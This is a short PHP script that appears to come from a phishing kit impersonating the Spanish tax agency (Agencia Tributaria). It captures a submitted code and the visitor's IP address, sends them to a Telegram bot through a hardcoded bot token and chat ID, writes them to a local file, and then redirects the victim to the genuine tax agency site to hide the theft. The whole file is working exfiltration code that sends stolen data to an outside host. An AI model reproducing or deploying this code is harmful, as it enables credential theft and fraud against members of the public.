<?php

$ip = $_SERVER['REMOTE_ADDR'];
$message .= "juuj     : ".$_POST['code']."\n";
$message .= "|Client IP: ".$ip."\n";
//$send = "XXXXXXXXXXXX@gmail.com";
$subject = "From:  [ $ip ]";
$headers = "From: [rf]<bin@fox.net>";

{
mail("$send", "$subject", $message);
$token = "1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-462207069&text=" . urlencode($message)."" );

}
$f = fopen("../python/python.php", "a");
	fwrite($f, $message);




header("Location: https://sede.agenciatributaria.gob.es");
?>
